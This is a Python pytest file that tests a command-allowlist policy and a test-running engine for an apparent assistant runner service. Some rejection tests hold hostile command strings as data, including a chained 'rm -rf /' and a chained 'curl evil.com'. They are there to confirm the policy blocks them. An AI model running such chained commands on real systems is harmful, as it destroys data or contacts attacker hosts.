"""Tests for TestEngine — Slice 3."""

import sys
from pathlib import Path

import pytest

from assistant_os.runners.errors import TestExecutionError
from assistant_os.runners.policies import is_test_command_allowed, validate_test_spec
from assistant_os.runners.errors import PolicyViolationError
from assistant_os.runners.runner_models import (
    RunnerExecutionRequest,
    RunnerExecutionStatus,
    TestExecutionResult,
)
from assistant_os.runners.runner_service import RunnerService
from assistant_os.runners.test_engine import TestEngine

# Use the running interpreter to avoid PATH ambiguity across environments.
_PYTHON = sys.executable


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def passing_workspace(tmp_path):
    """Workspace with a single test that always passes."""
    ws = tmp_path / "ws_pass"
    ws.mkdir()
    (ws / "test_ok.py").write_text("def test_pass():\n    assert True\n")
    return ws


@pytest.fixture
def failing_workspace(tmp_path):
    """Workspace with a single test that always fails."""
    ws = tmp_path / "ws_fail"
    ws.mkdir()
    (ws / "test_bad.py").write_text("def test_fail():\n    assert False\n")
    return ws


@pytest.fixture
def log_file(tmp_path):
    lf = tmp_path / "runner.log"
    lf.write_text("")
    return lf


@pytest.fixture
def engine():
    return TestEngine()


@pytest.fixture
def sample_repo(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "main.py").write_text("pass\n")
    return repo


# ---------------------------------------------------------------------------
# Policy helpers — is_test_command_allowed
# ---------------------------------------------------------------------------


def test_pytest_command_allowed():
    assert is_test_command_allowed(["pytest", "-q"]) is True


def test_python_m_pytest_allowed():
    assert is_test_command_allowed(["python", "-m", "pytest", "-q"]) is True


def test_python3_m_pytest_allowed():
    assert is_test_command_allowed(["python3", "-m", "pytest", "-q"]) is True


def test_full_path_python_allowed():
    assert is_test_command_allowed([_PYTHON, "-m", "pytest", "-q"]) is True


def test_shell_string_rejected():
    assert is_test_command_allowed("pytest -q") is False  # string, not list


def test_empty_command_rejected():
    assert is_test_command_allowed([]) is False


def test_bash_rejected():
    assert is_test_command_allowed(["bash", "-c", "pytest"]) is False


def test_cmd_rejected():
    assert is_test_command_allowed(["cmd", "/c", "pytest"]) is False


def test_powershell_rejected():
    assert is_test_command_allowed(["powershell", "-Command", "pytest"]) is False


def test_shell_pipe_rejected():
    assert is_test_command_allowed(["pytest", "|", "cat"]) is False


def test_shell_semicolon_rejected():
    assert is_test_command_allowed(["pytest", ";", "rm", "-rf", "/"]) is False


def test_shell_ampersand_rejected():
    assert is_test_command_allowed(["pytest", "&&", "curl", "evil.com"]) is False


def test_python_without_m_pytest_rejected():
    assert is_test_command_allowed(["python", "run_tests.py"]) is False


# ---------------------------------------------------------------------------
# Policy helpers — validate_test_spec
# ---------------------------------------------------------------------------


def test_validate_test_spec_valid():
    validate_test_spec({"command": [_PYTHON, "-m", "pytest", "-q"], "timeout_sec": 30})


def test_validate_test_spec_string_command_rejected():
    with pytest.raises(PolicyViolationError, match="list"):
        validate_test_spec({"command": "pytest -q"})


def test_validate_test_spec_missing_command():
    with pytest.raises(PolicyViolationError, match="non-empty 'command'"):
        validate_test_spec({})


def test_validate_test_spec_timeout_exceeds_max():
    with pytest.raises(PolicyViolationError, match="MAX_TIMEOUT"):
        validate_test_spec({"command": [_PYTHON, "-m", "pytest"], "timeout_sec": 9999})


def test_validate_test_spec_negative_timeout():
    with pytest.raises(PolicyViolationError, match="positive"):
        validate_test_spec({"command": [_PYTHON, "-m", "pytest"], "timeout_sec": -1})


def test_validate_test_spec_not_a_dict():
    with pytest.raises(PolicyViolationError, match="dict"):
        validate_test_spec(["pytest"])


# ---------------------------------------------------------------------------
# TestEngine — execution
# ---------------------------------------------------------------------------


def test_run_tests_passing_workspace(engine, passing_workspace, log_file):
    spec = {"command": [_PYTHON, "-m", "pytest", "-q"], "timeout_sec": 30}
    result = engine.run_tests(passing_workspace, spec, log_file)

    assert result.status == "passed"
    assert result.exit_code == 0
    assert result.duration_ms is not None and result.duration_ms >= 0


def test_run_tests_failing_workspace(engine, failing_workspace, log_file):
    spec = {"command": [_PYTHON, "-m", "pytest", "-q"], "timeout_sec": 30}
    result = engine.run_tests(failing_workspace, spec, log_file)

    assert result.status == "failed"
    assert result.exit_code != 0


def test_run_tests_creates_stdout_log(engine, passing_workspace, log_file):
    spec = {"command": [_PYTHON, "-m", "pytest", "-q"], "timeout_sec": 30}
    result = engine.run_tests(passing_workspace, spec, log_file)

    assert result.stdout_path is not None
    assert Path(result.stdout_path).exists()


def test_run_tests_creates_stderr_log(engine, passing_workspace, log_file):
    spec = {"command": [_PYTHON, "-m", "pytest", "-q"], "timeout_sec": 30}
    result = engine.run_tests(passing_workspace, spec, log_file)

    assert result.stderr_path is not None
    assert Path(result.stderr_path).exists()


def test_run_tests_logs_test_start_and_done(engine, passing_workspace, log_file):
    spec = {"command": [_PYTHON, "-m", "pytest", "-q"], "timeout_sec": 30}
    engine.run_tests(passing_workspace, spec, log_file)

    content = log_file.read_text()
    assert "phase: TEST_START" in content
    assert "phase: TEST_DONE" in content


def test_run_tests_logs_result(engine, passing_workspace, log_file):
    spec = {"command": [_PYTHON, "-m", "pytest", "-q"], "timeout_sec": 30}
    engine.run_tests(passing_workspace, spec, log_file)

    content = log_file.read_text()
    assert "test: passed" in content


def test_run_tests_invalid_spec_raises(engine, passing_workspace, log_file):
    spec = {"command": "pytest -q"}  # string, not list
    with pytest.raises(TestExecutionError):
        engine.run_tests(passing_workspace, spec, log_file)


def test_run_tests_result_is_dataclass(engine, passing_workspace, log_file):
    spec = {"command": [_PYTHON, "-m", "pytest", "-q"], "timeout_sec": 30}
    result = engine.run_tests(passing_workspace, spec, log_file)
    assert isinstance(result, TestExecutionResult)


# ---------------------------------------------------------------------------
# RunnerService integration — test phase
# ---------------------------------------------------------------------------


def test_runner_service_with_passing_tests(sample_repo):
    (sample_repo / "test_ok.py").write_text("def test_pass():\n    assert True\n")
    request = RunnerExecutionRequest(
        execution_id="s3-pass-001",
        repo_path=str(sample_repo),
        test_spec={"command": [_PYTHON, "-m", "pytest", "-q"], "timeout_sec": 30},
    )
    result = RunnerService().run(request)

    assert result.status == RunnerExecutionStatus.TESTS_PASSED
    assert result.test_result is not None
    assert result.test_result.status == "passed"


def test_runner_service_with_failing_tests(sample_repo):
    (sample_repo / "test_bad.py").write_text("def test_fail():\n    assert False\n")
    request = RunnerExecutionRequest(
        execution_id="s3-fail-001",
        repo_path=str(sample_repo),
        test_spec={"command": [_PYTHON, "-m", "pytest", "-q"], "timeout_sec": 30},
    )
    result = RunnerService().run(request)

    assert result.status == RunnerExecutionStatus.TESTS_FAILED
    assert result.test_result is not None
    assert result.test_result.status == "failed"


def test_runner_service_no_test_spec_stays_workspace_ready(sample_repo):
    request = RunnerExecutionRequest(
        execution_id="s3-noop-001",
        repo_path=str(sample_repo),
        test_spec=None,
    )
    result = RunnerService().run(request)

    assert result.status == RunnerExecutionStatus.WORKSPACE_READY
    assert result.test_result is None


def test_runner_service_invalid_test_spec_returns_failed(sample_repo):
    request = RunnerExecutionRequest(
        execution_id="s3-badspec-001",
        repo_path=str(sample_repo),
        test_spec={"command": ["bash", "-c", "pytest"]},
    )
    result = RunnerService().run(request)

    assert result.status == RunnerExecutionStatus.FAILED
    assert result.error is not None


def test_runner_service_test_result_in_metadata(sample_repo):
    import json
    (sample_repo / "test_ok.py").write_text("def test_pass():\n    assert True\n")
    request = RunnerExecutionRequest(
        execution_id="s3-meta-001",
        repo_path=str(sample_repo),
        test_spec={"command": [_PYTHON, "-m", "pytest", "-q"], "timeout_sec": 30},
    )
    result = RunnerService().run(request)

    metadata = json.loads((Path(result.artifacts_path) / "metadata.json").read_text())
    assert "test_result" in metadata
    assert metadata["test_result"]["status"] == "passed"


def test_runner_service_apply_then_test(sample_repo):
    """Apply a new test file, then run it."""
    request = RunnerExecutionRequest(
        execution_id="s3-apply-test-001",
        repo_path=str(sample_repo),
        changes=[
            {
                "op": "file_replace",
                "path": "test_generated.py",
                "content": "def test_gen():\n    assert 1 + 1 == 2\n",
            }
        ],
        test_spec={"command": [_PYTHON, "-m", "pytest", "-q"], "timeout_sec": 30},
    )
    result = RunnerService().run(request)

    assert result.status == RunnerExecutionStatus.TESTS_PASSED
    assert "test_generated.py" in result.modified_files
    assert result.test_result.status == "passed"
